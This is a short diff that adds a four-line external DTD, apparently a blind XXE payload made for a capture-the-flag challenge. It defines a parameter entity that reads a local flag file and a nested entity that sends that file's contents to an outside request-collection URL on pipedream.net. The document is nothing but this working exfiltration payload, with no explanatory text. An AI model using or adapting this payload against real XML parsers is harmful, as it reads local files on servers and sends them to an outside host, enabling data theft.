@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag-with-secret-name-that-is-hard-to-be-gu3553d-54bcf789.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://enk09iuno09fg.x.pipedream.net/?x=%file;'>">
+%eval;
+%exfiltrate;
